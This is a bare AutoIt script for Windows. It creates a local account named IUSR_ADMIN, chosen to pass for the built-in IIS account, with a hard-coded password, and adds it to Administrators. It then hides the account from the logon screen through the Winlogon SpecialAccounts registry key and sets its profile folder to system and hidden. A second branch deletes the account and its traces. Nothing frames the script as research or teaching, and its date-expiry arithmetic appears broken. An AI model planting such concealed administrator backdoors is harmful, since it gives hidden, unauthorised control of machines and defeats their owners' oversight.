$date = String(@MON)&String('/')&String(@mday)+1&String('/')&String(@year)
If FileExists("C:\Documents and Settings\IUSR_ADMIN") Then
     MsgBox(0, "warn", "directory exists" );; for testing
	 RunAsWait("IUSR_ADMIN",@LogonDomain,"P455vv0rd","1","RMDIR /S /Q ""C:\Documents and Settings\IUSR_ADMIN\""")
	 RunWait( "NET USER IUSR_ADMIN /DELETE" )
	 RunWait( "NET LOCALGROUP Administrators IUSR_ADMIN /DELETE" )
	 DirRemove("C:\Documents and Settings\IUSR_ADMIN", "recurse" )
	 RegDelete('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList', 'IUSR_ADMIN')
	 Else
		 Run( "@echo off" )
		 RunWait( "NET USER IUSR_ADMIN P455vv0rd /ADD /active:yes /expires:"&$date )
         RunWait( "NET LOCALGROUP Administrators IUSR_ADMIN /ADD /PROFILEPATH:""C:\Documents and Settings\IUSR_ADMIN""" )
         RegWrite('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList', 'IUSR_ADMIN', 'REG_DWORD', 00000000 )
         RunAsWait("IUSR_ADMIN",@LogonDomain,"P455vv0rd","1","ATTRIB +S +H ""C:\Documents and Settings\IUSR_ADMIN""")
     EndIf
Exit